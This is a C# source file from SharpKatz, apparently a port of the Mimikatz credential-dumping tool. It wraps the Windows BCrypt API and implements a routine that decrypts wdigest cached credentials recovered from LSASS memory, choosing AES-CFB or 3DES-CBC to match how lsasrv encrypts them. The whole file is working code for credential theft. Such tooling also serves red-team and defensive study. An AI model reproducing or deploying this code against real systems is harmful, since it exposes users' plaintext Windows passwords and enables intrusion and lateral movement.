using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using static SharpKatz.Win32.Natives;
using static SharpKatz.Crypto.Natives;

namespace SharpKatz.Crypto
{
#pragma warning disable 618    // Have not migrated to v4 transparency yet
    [System.Security.SecurityCritical(System.Security.SecurityCriticalScope.Everything)]
#pragma warning restore 618
    internal sealed class SafeBCryptAlgorithmHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeBCryptAlgorithmHandle() : base(true)
        {
        }

        protected override bool ReleaseHandle()
        {
            return BCryptCloseAlgorithmProvider(handle, 0) == NTSTATUS.Success;
        }
    }

    [SecuritySafeCritical]
    internal sealed class SafeBCryptKeyHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        internal SafeBCryptKeyHandle() : base(true) { }

        

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        protected override bool ReleaseHandle()
        {
            return BCryptDestroyKey(handle) == NTSTATUS.Success;
        }
    }

    class BCrypt
    {
        // Decrypt wdigest cached credentials using AES or 3Des 
        public static  byte[] DecryptCredentials(byte[] encrypedPass, byte[] IV, byte[] aeskey, byte[] deskey)
        {
            SafeBCryptAlgorithmHandle hProvider, hDesProvider;
            SafeBCryptKeyHandle hAes, hDes;
            int result;
            NTSTATUS status;

            byte[] passDecrypted = new byte[1024];
            byte[] initializationVector = new byte[16];

            // Same IV used for each cred, so we need to work on a local copy as this is updated
            // each time by BCryptDecrypt
            Array.Copy(IV, initializationVector, IV.Length);

            if ((encrypedPass.Length % 8) != 0)
            {
                // If suited to AES, lsasrv uses AES in CFB mode
                BCryptOpenAlgorithmProvider(out hProvider, BCRYPT_AES_ALGORITHM, null, 0);
                BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CFB, BCRYPT_CHAIN_MODE_CFB.Length, 0);

                GCHandle pkeypinnedArray = GCHandle.Alloc(aeskey, GCHandleType.Pinned);
                IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();

                GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                BCryptGenerateSymmetricKey(hProvider, out hAes, IntPtr.Zero, 0, pkey, aeskey.Length, 0);
                status = BCryptDecrypt(hAes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, IV.Length, ppassDecrypted, passDecrypted.Length, out result, 0);
                if (status != 0)
                {
                    return null;
                }

            }
            else
            {
                // If suited to 3DES, lsasrv uses 3DES in CBC mode
                BCryptOpenAlgorithmProvider(out hDesProvider, BCRYPT_3DES_ALGORITHM, null, 0);
                BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, BCRYPT_CHAIN_MODE_CBC.Length, 0);

                GCHandle pkeypinnedArray = GCHandle.Alloc(deskey, GCHandleType.Pinned);
                IntPtr pkey = pkeypinnedArray.AddrOfPinnedObject();

                GCHandle pencrypedPasspinnedArray = GCHandle.Alloc(encrypedPass, GCHandleType.Pinned);
                IntPtr pencrypedPass = pencrypedPasspinnedArray.AddrOfPinnedObject();

                GCHandle pinitializationVectorpinnedArray = GCHandle.Alloc(initializationVector, GCHandleType.Pinned);
                IntPtr pinitializationVector = pinitializationVectorpinnedArray.AddrOfPinnedObject();

                GCHandle ppassDecryptedinnedArray = GCHandle.Alloc(passDecrypted, GCHandleType.Pinned);
                IntPtr ppassDecrypted = ppassDecryptedinnedArray.AddrOfPinnedObject();

                BCryptGenerateSymmetricKey(hDesProvider, out hDes, IntPtr.Zero, 0, pkey, deskey.Length, 0);
                status = BCryptDecrypt(hDes, pencrypedPass, encrypedPass.Length, IntPtr.Zero, pinitializationVector, 8, ppassDecrypted, passDecrypted.Length, out result, 0);
                if (status != 0)
                {
                    return null;
                }
                
            }
            
            Array.Resize(ref passDecrypted, result );

            return passDecrypted;
        }
    }

    class Natives
    {
        public static string BCRYPT_AES_ALGORITHM = "AES";
        public static string BCRYPT_3DES_ALGORITHM = "3DES";
        public static string BCRYPT_CHAINING_MODE = "ChainingMode";

        public static string BCRYPT_CHAIN_MODE_CBC = "ChainingModeCBC";
        public static string BCRYPT_CHAIN_MODE_CFB = "ChainingModeCFB";

        [DllImport("bcrypt")]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        public static extern NTSTATUS BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int flags);

        [DllImport("bcrypt.dll")]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        internal static extern NTSTATUS BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern NTSTATUS BCryptOpenAlgorithmProvider(out SafeBCryptAlgorithmHandle phAlgorithm,
                                                                         string pszAlgId,             // BCryptAlgorithm
                                                                         string pszImplementation,    // ProviderNames
                                                                         int dwFlags);
        [DllImport("bcrypt.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern NTSTATUS BCryptSetProperty(
                SafeHandle hProvider,
                string pszProperty,
                string pbInput,
                int cbInput,
                int dwFlags);

        [DllImport("bcrypt.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern  NTSTATUS BCryptGenerateSymmetricKey(
            SafeBCryptAlgorithmHandle hAlgorithm,
            out SafeBCryptKeyHandle phKey,
            IntPtr pbKeyObject,
            int cbKeyObject,
            IntPtr pbSecret,
            int cbSecret,
            int flags);

        [DllImport("bcrypt.dll", SetLastError = true)]
        public static  extern NTSTATUS BCryptDecrypt(
            SafeBCryptKeyHandle hKey,
            IntPtr pbInput,
            int cbInput,
            IntPtr pPaddingInfo,
            IntPtr pbIV,
            int cbIV,
            IntPtr pbOutput,
            int cbOutput,
            out int pcbResult,
            int dwFlags);
    }
}
